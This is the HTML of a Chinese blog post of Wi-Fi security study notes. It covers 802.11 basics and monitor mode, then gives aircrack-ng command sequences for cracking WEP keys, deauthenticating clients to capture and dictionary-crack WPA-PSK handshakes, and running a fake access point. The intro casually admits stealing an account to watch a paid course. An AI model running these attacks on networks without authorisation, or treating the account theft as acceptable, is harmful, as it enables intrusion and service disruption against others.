@@ -1,0 +1,821 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="最近在玩无线大致把常规的攻击手法复习了一遍、看的是某VIP网站上面一套Kali的视频其中一章无线安全，然后我就盗了个号免费看，这部课程理论非常全面但我也只能似懂非懂的感觉然后记录下来，无线安全来来回回这样其实玩2个月无线和2年无线没有区别，如果想再进一步深造那就是各种理论知识。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wifi安全笔记">
+<meta property="og:url" content="http://yoursite.com/2017/10/26/Wifi安全笔记/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="最近在玩无线大致把常规的攻击手法复习了一遍、看的是某VIP网站上面一套Kali的视频其中一章无线安全，然后我就盗了个号免费看，这部课程理论非常全面但我也只能似懂非懂的感觉然后记录下来，无线安全来来回回这样其实玩2个月无线和2年无线没有区别，如果想再进一步深造那就是各种理论知识。">
+<meta property="og:image" content="https://i.imgur.com/xaR2KPK.jpg">
+<meta property="og:image" content="https://i.imgur.com/De1qf6a.jpg">
+<meta property="og:image" content="https://i.imgur.com/7uHvMuY.jpg">
+<meta property="og:image" content="https://i.imgur.com/leE8i76.jpg">
+<meta property="og:image" content="https://i.imgur.com/u9QLGZS.jpg">
+<meta property="og:image" content="https://i.imgur.com/e3HyXr2.jpg">
+<meta property="og:image" content="https://i.imgur.com/YtkrRmq.jpg">
+<meta property="og:image" content="https://i.imgur.com/9eGmpII.jpg">
+<meta property="og:image" content="https://i.imgur.com/c4XRsAy.jpg">
+<meta property="og:image" content="https://i.imgur.com/twCC4qu.jpg">
+<meta property="og:image" content="https://i.imgur.com/B10ta0m.jpg">
+<meta property="og:image" content="https://i.imgur.com/xervZvv.jpg">
+<meta property="og:image" content="https://i.imgur.com/FdFg62e.jpg">
+<meta property="og:image" content="https://i.imgur.com/peOrNFX.jpg">
+<meta property="og:image" content="https://i.imgur.com/jCaUNky.jpg">
+<meta property="og:image" content="https://i.imgur.com/gZqMOhr.png">
+<meta property="og:image" content="https://i.imgur.com/pm0JC8Z.jpg">
+<meta property="og:image" content="https://i.imgur.com/ag3yLIe.jpg">
+<meta property="og:image" content="https://i.imgur.com/TOW7DI6.jpg">
+<meta property="og:image" content="https://i.imgur.com/8CVhQev.jpg">
+<meta property="og:image" content="https://i.imgur.com/PguA0rf.jpg">
+<meta property="og:image" content="https://i.imgur.com/LbnfkiT.jpg">
+<meta property="og:image" content="https://i.imgur.com/RNsEk9P.jpg">
+<meta property="og:image" content="https://i.imgur.com/CqPkKpo.jpg">
+<meta property="og:updated_time" content="2017-10-28T05:58:45.016Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Wifi安全笔记">
+<meta name="twitter:description" content="最近在玩无线大致把常规的攻击手法复习了一遍、看的是某VIP网站上面一套Kali的视频其中一章无线安全，然后我就盗了个号免费看，这部课程理论非常全面但我也只能似懂非懂的感觉然后记录下来，无线安全来来回回这样其实玩2个月无线和2年无线没有区别，如果想再进一步深造那就是各种理论知识。">
+<meta name="twitter:image" content="https://i.imgur.com/xaR2KPK.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> Wifi安全笔记 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Wifi安全笔记
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-10-26T22:28:17+08:00" content="2017-10-26">
+              2017-10-26
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/10/26/Wifi安全笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/26/Wifi安全笔记/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.imgur.com/xaR2KPK.jpg" alt=""></p>
+<p>最近在玩无线大致把常规的攻击手法复习了一遍、看的是某VIP网站上面一套Kali的视频其中一章无线安全，然后我就盗了个号免费看，这部课程理论非常全面但我也只能似懂非懂的感觉然后记录下来，无线安全来来回回这样其实玩2个月无线和2年无线没有区别，如果想再进一步深造那就是各种理论知识。<br><a id="more"></a></p>
+<h2 id="无线技术特点"><a href="#无线技术特点" class="headerlink" title="无线技术特点"></a>无线技术特点</h2><p>互联网重要入口<br>边界模糊<br>安全实施缺失而且困难<br>对技术不了解而造成配置不当<br>企业网络私自接入ap破坏网络边界</p>
+<h3 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h3><p>IEEE<code>(Institute of Electrical and Eletronics Engineers)</code><br>邮通信航天生物电气电子等方面的科学家组成、目的是制定标准，指导行业技术的发展，目前成员近40万人</p>
+<p>802的一些标准一部分<br><img src="https://i.imgur.com/De1qf6a.jpg" alt=""></p>
+<p>802.11只工作在最下面两层</p>
+<p>无线<br>应用层<br>表示层<br>会话层<br>传输层<br>网络层<br>数据链路层<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逻辑链路控制子层LLC<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;媒体访问控制子层MAC<br>物理层   </p>
+<h3 id="IEEE-802-11标准"><a href="#IEEE-802-11标准" class="headerlink" title="IEEE 802.11标准"></a>IEEE 802.11标准</h3><p>802委员会下第11组负责开发无线局域网标准                                     </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IEEE 802.1 1 The Original WLAN Standard- 1 Mbit/s and 2 Mbit/w,2.4GHz RF and</span><br><span class="line">IR                                                                          </span><br><span class="line">IEEE 802.11 a 54 Mbit/s,5 GHz                                               </span><br><span class="line">IEEE 802.11 b 802.11 Enhancements to Support 5.5 Mbit/s and 11 Mbit/s       </span><br><span class="line">IEEE 802.11 c Bridge Operation Procedure                                    </span><br><span class="line">IEEE 802.11 d International (Country to Country) Roaming Extensions         </span><br><span class="line">IEEE 802.11 e Quality of Service (Qos),Including Packet Bursting            </span><br><span class="line">IEEE 802.11 F Inter -Access Point Protocol                                  </span><br><span class="line">IEEE 802.11 g 54 Mbit/s,2.4 GHz                                             </span><br><span class="line">IEEE 802.11 h Spectrum Managed 802.11 a (5 GHz) for European Compatibility  </span><br><span class="line">IEEE 802.11 i Enhanced Security</span><br></pre></td></tr></table></figure>
+<h4 id="日常使用标准"><a href="#日常使用标准" class="headerlink" title="日常使用标准"></a>日常使用标准</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IEEE 802.11 - The original WLAN standard                                              </span><br><span class="line">IEEE 802.11 a - UP to 54 Mbit/s on 5 GHz                                              </span><br><span class="line">IEEE 802.11 b - 5.5 Mbit/s and 11 Mbit/s  on 2.4 GHz                                  </span><br><span class="line">IEEE 802.11 g - Up to 54 Mbit/s  on 2.4 GHz.Backward compatible with 802.11b          </span><br><span class="line">IEEE 802.11 i - Provides enhanced security                                            </span><br><span class="line">IEEE 802.11 n - Provides higher throughput with Multiple Input/Multiple Output (MIMO)</span><br></pre></td></tr></table></figure>
+<p>802.11<br>发布于1997年<br>速率1Mbps或2Mbps<br>红外线传输介质（未实现）<br>无线射频信号编码（调制）（radio frequencies）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Direct-Sequence Spread-Spectrum (DSSS)—–直序扩频<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Frequency Hopping Spread-Spectrum (FHSS)—–跳频扩频<br>媒体访问方式—–CSMA/CA c=b+log2 (1+s/n)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据算法侦听一定时长<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发送数据前发包声明<br>Request to Send/Clear to Send (RTS/CTS)    </p>
+<p>802.11b<br>Complementary Code Keying (CCK)—–补充代码键<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.5 and 11 Mbit/s<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.4GHz band (2.4GHz - 2.485GHz)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14个重叠的信道channels<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每个信道22MHz宽带<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只有三个完全不重叠的信道<br>美国 -1 to 11 (2.412 GHz - 2.462 GHz)<br>欧洲 -1 to 13 (2.412 GHz - 2.472 GHz)<br>日本 -1 to 14 (2.412 GHz - 2.482 GHz)      </p>
+<p>Infrastructure<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AP 维护SSID<br>Ad-Hoc<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STA 维护SSID<br>Service Set Identifier(SSID)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AP每秒钟约10次通过Beacon帧广播SSID<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;客户端连接到无线网络后也会宣告SSID</p>
+<h3 id="MONITOR-MODR"><a href="#MONITOR-MODR" class="headerlink" title="MONITOR MODR"></a>MONITOR MODR</h3><p>Monitor不是一种真的无线模式<br>但是对无线渗透至关重要<br>允许无线网卡没有任何筛选的(802.11包头)<br>与有线网络的混杂模式可以类比<br>合适的网卡和驱动不但可以monitor，更可以injection</p>
+<h3 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a>无线技术概念</h3><p>分贝dB                                     </p>
+<blockquote>
+<p>   测量无线信号强度         </p>
+</blockquote>
+<p>B: 向Alexander Graham Bell致敬                    </p>
+<blockquote>
+<p>   今天大部分声学涉笔的发明者和理论奠基人        </p>
+</blockquote>
+<p>dB: 表示2个信号之间的差异比率，用于描述设备的强度 </p>
+<blockquote>
+<p>   是一个相对值                                  </p>
+</blockquote>
+<p>dBm: 功率与lmW进行比较的dB值结果                  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                  signal             100mW</span><br><span class="line">DBPower = 10.log(--------)   10.log(--------) = 10.2 = 20dBm</span><br><span class="line">                 reference            1mW</span><br></pre></td></tr></table></figure>
+<p>dBd是定向天线的增益值<br>全向天线在所有方向上收发信号，定向无线在指定方向的范围内收发信号,天线增益越大信号传输距离越远   </p>
+<blockquote>
+<p>定向天线                                                </p>
+<blockquote>
+<p>双四边形<br>定向发送信号<br>功率相同时，比全向天线传输距离更远(方向正确的情况下)</p>
+</blockquote>
+</blockquote>
+<p><img src="https://i.imgur.com/7uHvMuY.jpg" alt=""></p>
+<p>八木天线；引向反射天线<br><img src="https://i.imgur.com/leE8i76.jpg" alt=""></p>
+<p>平面天线       </p>
+<h3 id="无线网卡的选择"><a href="#无线网卡的选择" class="headerlink" title="无线网卡的选择"></a>无线网卡的选择</h3><p>定向天线<br><img src="https://i.imgur.com/u9QLGZS.jpg" alt=""></p>
+<h4 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a>查看无线网卡</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desmg -T  //硬件设备的变化</span><br><span class="line">iwconfig  //查看无线网卡</span><br><span class="line">ifconfig</span><br><span class="line">iw list 	  //查看当前驱动支持模式</span><br></pre></td></tr></table></figure>
+<h5 id="信道频道"><a href="#信道频道" class="headerlink" title="信道频道"></a>信道频道</h5><p>iwlist wlan0 frequency<br><img src="https://i.imgur.com/e3HyXr2.jpg" alt=""></p>
+<h4 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a>扫描附近AP</h4><p><code>iw dev wlan0 scan | grep SSID</code><br><img src="https://i.imgur.com/YtkrRmq.jpg" alt=""></p>
+<p><code>iw dev wlan0 scan | egrep &quot;DS\ Parameter\ set|SSID&quot;</code><br><img src="https://i.imgur.com/9eGmpII.jpg" alt=""></p>
+<p><code>iwlist wlan0 scanning | egrep &quot;ESSID|Channel&quot;</code><br><img src="https://i.imgur.com/c4XRsAy.jpg" alt=""></p>
+<h4 id="添加删除帧听端口"><a href="#添加删除帧听端口" class="headerlink" title="添加删除帧听端口"></a>添加删除帧听端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop  //关闭本地网络连接                      </span><br><span class="line">iw dev wlan2 interface add wlan0mon <span class="built_in">type</span> monitor    </span><br><span class="line">tcpdump <span class="_">-s</span> 0 -i wlan0mon -p                     </span><br><span class="line">iw dev wlan0mon interface del</span><br></pre></td></tr></table></figure>
+<h4 id="WAP安全系统"><a href="#WAP安全系统" class="headerlink" title="WAP安全系统"></a>WAP安全系统</h4><p>Wi-Fi Protected Access<br>802.11组为提高无线安全，开发两个新的链路层加密协议<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Temporal Key Integrity Protocol (TKIP)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WPA1 (较之WEP可动态改变密钥)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Counter Mode with CBC-MAC (CCMP)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WP2                                       </p>
+<h5 id="WPA加密两种安全类型"><a href="#WPA加密两种安全类型" class="headerlink" title="WPA加密两种安全类型"></a>WPA加密两种安全类型</h5><p>WPA个人: 使用预设共享密钥实现身份验证<br>WPA企业: 使用800.1X和Radius服务器实现AAA   </p>
+<h2 id="基本操作步骤"><a href="#基本操作步骤" class="headerlink" title="基本操作步骤"></a>基本操作步骤</h2><p>先停止本地网卡服务，否则会遇到很多问题</p>
+<p><code>service network-manager stop</code></p>
+<p><code>airmon-ng check</code>     检查<br><img src="https://i.imgur.com/twCC4qu.jpg" alt=""></p>
+<p>如果在操作以下步骤有问题可以回到此步骤执行:<br><img src="https://i.imgur.com/B10ta0m.jpg" alt=""></p>
+<p><code>airmon-ng start wlan0</code>   开启混杂模式   </p>
+<p><code>iwlist wlan0mon channel</code>  检查当前工作信道<br><img src="https://i.imgur.com/xervZvv.jpg" alt=""></p>
+<p><code>airmon-ng stop wlan0mon</code>  关闭<br>当关闭之后<code>ifconfig</code>是无法看到网卡的所以需要激活<br><code>ifconfig wlan0 up</code>  激活<br><code>iw dev wlan0mon set channel 11</code>    启用11信道</p>
+<p><code>airodump-ng wlan0mon</code> 监听<br><img src="https://i.imgur.com/FdFg62e.jpg" alt=""></p>
+<p><code>BSSID</code>: AP的MAC地址<br><code>PWR</code>: 网卡接收到的信号强度，距离越近信号越强<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-1: 驱动不支持信号强度、STA距离超出信号接受范围<br><code>RXQ</code>: 最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有固定信道时才会出现<br><code>Beacons</code>: 接收到此AP发送的beacon帧数量<br><code>Data</code>: 抓到的数据帧数量(WEP表示IV数量)，包含广播数据帧<br><code>/s</code>: 最近10秒内，每秒平均抓到的帧的数量<br><code>CH</code>: 信道好(从beacon帧中获得)，信道重叠时可能发现其他信道<br><code>MB</code>: AP支持的最大速率<br><code>ENC</code>: 采用的无线安全技术WEP、WPA、WPA2、OPEN</p>
+<h3 id="AIREPLAY-NG"><a href="#AIREPLAY-NG" class="headerlink" title="AIREPLAY-NG"></a>AIREPLAY-NG</h3><p>产生或者加速无线通信流量<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;向无线网络中注入数据包<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;伪造身份验证<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;强制重新身份验证<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;抓包重放<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于后续WEP和WPA密码破解<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持10种包注入<br>获取包的两种途径<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定接口(-i)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;抓包文件pcap(-r)     </p>
+<h3 id="AIREPLAY-NG排错"><a href="#AIREPLAY-NG排错" class="headerlink" title="AIREPLAY-NG排错"></a>AIREPLAY-NG排错</h3><p>Aireplay-ng命令挂起没有任何输出<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;无线网卡与AP工作在不同信道<br>报错<code>&quot;write failed: Cannot allocate memory wi_write():illegal seek&quot;</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;无线网卡使用Broadcom芯片（bcm43xx),替换为b43驱动可解决<br>可注入但速度很慢，并提示内核消息<code>&quot;rtc:lost some interrupts at 1024Hz&quot;</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没有修正方法，此时可以启动多个<code>aireplay-ng</code>命令提高速度<br>使用-h参数指定注入MAC地址与网卡MAC地址不一致报错<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;建议保持一致 (macchange)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改无线网卡中的MAC地址：macchange -m 00:11:11:11:11:11 wlan0mon<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;macchanger -m 68:3E:34:30:0F:AA wlan0</p>
+<h2 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h2><p>目前用的WEP加密模式非常少这里我没有实践只接记录下来</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><blockquote>
+<p>启动monitor模式<br>启动抓包并保存抓包<br>Deauthentication抓包XOR文件<br>利用XOR文件与AP建立关联<br>执行ARP重放<br>Deauthenticiation触发ARP数据包<br>收集足够DATA之后破解密码  </p>
+</blockquote>
+<h3 id="wep破解操作步骤"><a href="#wep破解操作步骤" class="headerlink" title="wep破解操作步骤"></a>wep破解操作步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line"></span><br><span class="line">airmon-ng check <span class="built_in">kill</span></span><br><span class="line"></span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line">airodump-ng wlan0mon  //查找AP</span><br><span class="line"></span><br><span class="line">airodump-ng -c 11 --bssid BSSIDMAC地址 -w crack wlan0mon //选定需要破解的路由器继续抓取,抓到一定量</span><br><span class="line"></span><br><span class="line">aireplay-ng -1 60 <span class="_">-e</span> kifi -y wep-01-EC-26-CA-DC-29-86.xor <span class="_">-a</span> EC:26:CA:DC:29:B6 -h 08-57-00-0C-96-68 wlan0mon   </span><br><span class="line">//第一种注入方式，每60秒发一次authentication进行身份认证，关联目标wifibSSID，密钥流，AP,本机网卡的manage地址</span><br><span class="line"></span><br><span class="line">aireplay-ng -0 1 <span class="_">-a</span> EC:26:CA:DC:29:B6 -C 68:3E:34:30:0F:AA wlan0mon   //解除关联关系</span><br><span class="line"></span><br><span class="line">aireplay-ng -0 10 <span class="_">-a</span> EC:26:CA:DC:29:B6 -C 68:3E:34:30:0F:AA wlan0mon</span><br><span class="line"></span><br><span class="line">aireplay-ng -3 -b EC:26:CA:DC:29:B6 -h 08:57:00:0C:96:68 wlan0mon</span><br><span class="line"></span><br><span class="line">aireplay-ng -0 2 <span class="_">-a</span> EC:26:CA:DC:29:B6 -c 68:3E:34:30:0F:AA wlan0mon  //把客户端打掉然后重连</span><br><span class="line"></span><br><span class="line">aircrack-ng wep-01.cap</span><br></pre></td></tr></table></figure>
+<h2 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a>WPA PSK攻击</h2><p>只有一种密码破解方法<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WPA不存在WEP的弱点<br>只能暴力破解<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPU资源<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;时间<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字典质量<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网上共享的字典<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露密码<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;地区电话号码段<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Crunch生成字典<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kali中自带的字典文件</p>
+<h3 id="PSK破解过程"><a href="#PSK破解过程" class="headerlink" title="PSK破解过程"></a>PSK破解过程</h3><blockquote>
+<p>启动monitor<br>开始抓包并保存<br>Deauthentication攻击获取4步握手信息<br>使用字典暴力破解    </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng start wlan0</span><br><span class="line">airodump-ng wlan0mon</span><br><span class="line">airodump-ng wlan0mon --bssid EC:25:CA:DC:29:B6 -c 11 -w wpa</span><br><span class="line">airoplay-ng -0 2 <span class="_">-a</span> EC:25:CA:DC:29:B6 -c 50:3E:34:30:0F:AA wlan0mon</span><br><span class="line">aircrack-ng -w /usr/share/john/password.list wpa-01.cap</span><br><span class="line">airbase-ng --essid lcon -c 11 wlan0mon    //伪装AP</span><br></pre></td></tr></table></figure>
+<h2 id="几种本地破解密码方法"><a href="#几种本地破解密码方法" class="headerlink" title="几种本地破解密码方法"></a>几种本地破解密码方法</h2><h3 id="AIROLIB破解密码"><a href="#AIROLIB破解密码" class="headerlink" title="AIROLIB破解密码"></a>AIROLIB破解密码</h3><p>设计用于存储ESSID和密码列表<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;计算生成不变的PMK（计算资源消耗型）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过完整性摘要值破解密码<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQLlite3数据库存储数据     </p>
